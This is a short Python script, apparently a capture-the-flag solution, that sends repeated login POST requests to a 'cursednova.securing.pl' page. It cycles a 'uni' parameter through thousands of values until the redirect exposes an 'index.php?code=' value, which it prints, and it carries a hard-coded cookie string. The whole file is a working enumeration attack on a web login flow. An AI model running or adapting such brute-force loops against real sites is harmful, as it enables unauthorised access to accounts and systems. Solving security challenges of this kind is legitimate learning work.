import requests
import urllib.parse

COOKIE = '3fd54d59e0b418538b9188d551aa996d'

def main():
    for uni in range(1, 10_000):
        resp = requests.post('https://uni1.cursednova.securing.pl/index.php?page=login', data={
            'username': 'admin1337',
            'password': 'admin1337',
            'uni': uni,
        })
        if 'index.php?code=' in resp.url:
            fullurl = urllib.parse.unquote_plus(resp.url)
            print(uni)
            print(fullurl.split('index.php?code=')[-1])
            break


if __name__ == '__main__':
    main()